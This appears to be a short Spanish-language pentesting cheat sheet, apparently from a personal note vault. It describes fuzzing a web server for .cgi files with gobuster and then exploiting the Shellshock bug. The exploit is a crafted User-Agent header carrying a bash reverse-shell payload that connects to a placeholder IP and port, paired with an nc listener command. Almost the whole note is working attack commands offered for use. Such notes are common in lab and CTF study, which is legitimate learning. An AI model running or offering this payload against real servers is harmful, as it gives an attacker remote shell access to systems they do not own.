Hacer fuzzing buscando archivos con extensions `.cgi` 

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x cgi
``` 

User-Agent:
```
() { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP_objetivo>/<puerto> 0>&1' 
```

![[Pasted image 20260605164010.png]]

Escuchar puerto ReverseShell:
```
nc -lvnp <puerto>
```

SEND